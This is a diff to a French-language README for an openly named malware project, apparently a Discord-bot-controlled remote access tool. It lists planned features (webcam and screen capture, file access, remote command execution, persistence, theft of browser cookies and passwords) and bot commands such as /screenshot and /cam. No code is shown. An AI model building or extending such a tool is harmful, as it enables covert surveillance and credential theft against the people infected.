@@ -11,16 +11,22 @@
 
 ### fonctionnalité à ajouter:
 
-~~-pouvoir récupérer un screenshot de l'écran~~</br>
--pouvoir récupérer l'ip</br>
--pouvoir récupérer une photo ou un gif de la cam</br>
+~~-pouvoir récupérer un screenshot de l'écran~~ou un gif</br>
+-pouvoir récupérer l'ip</br> -~~pouvoir récupérer une photo de la cam~~ ou un gif</br>
 -pouvoir naviger dans les fichiers et les télécharger supprimer ou modifier</br>
 -ajouter une fonction pour pouvoir accéder au cmd (session ou on garde le pipe)</br>
 -RCE</br>
 -automatique du bot en .exe par un script simple</br>
 -automatiser la génération du token du bot que l'on vas associé au malware généré</br>
 -rendre le programme persitent</br>
--ajouter une fonction pour récupérer les cookies et les mdp du navigateur
+-ajouter une fonction pour récupérer les cookies et les mdp du navigateur</br>
+-commande help</br>
+-réponse dans des embeds</br>
+
+### utilisation:
+
+`/screenshot` -> prend un screenshot de l'écran</br>
+`/cam x` ou `/pic x`-> prend une photo avec la webcam n°`x` 0 si x non spécifié
 
 ### Mon discord
 
